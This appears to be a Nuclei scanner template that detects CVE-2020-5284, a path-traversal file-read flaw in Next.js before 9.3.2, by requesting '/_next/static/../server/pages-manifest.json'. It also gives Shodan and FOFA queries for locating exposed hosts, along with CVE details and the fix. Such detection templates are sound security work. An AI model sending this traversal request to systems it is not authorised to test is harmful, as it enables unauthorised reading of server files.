http:
- matchers:
  - part: header
    type: word
    words:
    - application/json
  - part: body
    regex:
    - \{"/_app":".*?_app\.js"
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/_next/static/../server/pages-manifest.json'
id: CVE-2020-5284
info:
  author: rootxharsh,iamnoooob,dwisiswant0
  classification:
    cpe: cpe:2.3:a:zeit:next.js:*:*:*:*:*:*:*:*
    cve-id: CVE-2020-5284
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 4.3
    cwe-id: CWE-22,CWE-23
    epss-percentile: 0.99048
    epss-score: 0.79765
  description: Next.js versions before 9.3.2 are vulnerable to local file inclusion.
    An attacker can craft special requests to access files in the dist directory (.next).
    This does not affect files outside of the dist directory (.next). In general,
    the dist directory only holds build assets unless your application intentionally
    stores other assets under this directory.
  impact: 'An attacker can exploit this vulnerability to read sensitive files on the
    server, potentially leading to unauthorized access or information disclosure.

    '
  metadata:
    fofa-query: body="/_next/static"
    max-request: 1
    product: next.js
    shodan-query:
    - http.html:"/_next/static"
    - cpe:"cpe:2.3:a:zeit:next.js"
    vendor: zeit
  name: Next.js <9.3.2 - Local File Inclusion
  reference:
  - https://github.com/zeit/next.js/releases/tag/v9.3.2
  - https://github.com/zeit/next.js/security/advisories/GHSA-fq77-7p7r-83rj
  - https://nvd.nist.gov/vuln/detail/CVE-2020-5284
  - https://github.com/Z0fhack/Goby_POC
  - https://github.com/merlinepedra/nuclei-templates
  remediation: This issue is fixed in version 9.3.2.
  severity: medium
  tags: cve,cve2020,nextjs,lfi,zeit,vuln
